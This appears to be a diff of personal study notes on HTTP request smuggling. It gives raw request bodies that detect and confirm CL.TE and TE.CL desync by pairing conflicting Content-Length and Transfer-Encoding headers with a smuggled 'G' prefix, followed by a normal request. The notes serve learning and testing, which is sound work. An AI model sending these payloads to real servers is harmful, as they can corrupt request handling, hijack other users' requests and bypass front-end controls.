@@ -16,6 +16,7 @@ Repeater --> uncheck Update Content-Length
 ![[Pasted image 20240815101531.png]]
 # CL.TE
 Detect
+
 ```
 Content-Length: 6
 Transfer-Encoding: chunked
@@ -33,23 +34,14 @@ Transfer-Encoding: chunked
 
 0
 
-X
+G
 ```
 
+send normal request
 
 # TE.CL
 
 Detect
-```
-Content-Length: 6
-Transfer-Encoding: chunked
-
-3
-abc
-X
-```
-
-Confirm
 
 ```
 Content-Length: 6
@@ -60,6 +52,21 @@ Transfer-Encoding: chunked
 X
 ```
 
+Confirm
+
+```
+Content-Length: 3
+Transfer-Encoding: chunked
+
+1
+G
+0
+
+
+```
+
+
+send normal request
 
 
 
